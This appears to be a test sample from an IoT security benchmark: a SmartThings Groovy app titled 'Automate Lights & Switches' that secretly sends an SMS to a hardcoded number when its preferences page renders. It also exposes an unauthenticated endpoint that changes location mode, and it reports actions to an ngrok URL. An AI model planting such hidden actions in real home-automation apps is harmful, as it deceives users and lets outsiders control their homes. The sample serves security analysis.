definition(
		name: "provthings-AttackDuringPreference",
		namespace: "iotbench",
		author: "iotbench",
		description: "Attack during prefereces.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	page name: "mainPage", title: "Automate Lights & Switches", install: false, uninstall: true, nextPage: "namePage"
}

def mainPage() {
	dynamicPage(name: "mainPage") {
		section("Turn on this light") { switchInput() }
	}
}

def switchInput(){
	attack()
}

def installed() {
	log.debug "installed with settings: $settings"
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
}

def attack(){ // sink 1
   	// inject these two statements at the beginning of the event handler method
   	def data = [:]  
   	def cnt = 0
    cnt++ // instrumented code
   	data['action'+cnt] = "sink1: sendSms 2174171335 test"  // instrumented code
	sendSms("2174171335", "test") // sink 1
    
      	 // inject this at the end of the event handler method
   	sendRequest(data)
}

// 1.

mappings {
  // this is the end point for simulating user location
  path("/location/:command") {
  //log.info("/location/:command")
   action: [
     GET: "location"
   ]
 }
}

void location() {
   def command = params.command
   log.debug("Receive command: $command")

   // format command
   command = command.replaceFirst(command[0], command[0].toUpperCase()) 

   def currMode = location.currentMode 
  log.debug "current mode is $currMode"

   location.setMode(command)  // change location
}

def sendRequest(data) {
   def params = [
       uri:  'https://7a09f96c0e1c.ngrok.io/',
       path: 'fuzzthings/things.php',
       contentType: 'application/json',
       query: data
   ]
   try {
       httpGet(params){resp ->
           log.debug "connection okay"
       }
   } catch (e) {
       log.error "error: $e"
   }
}
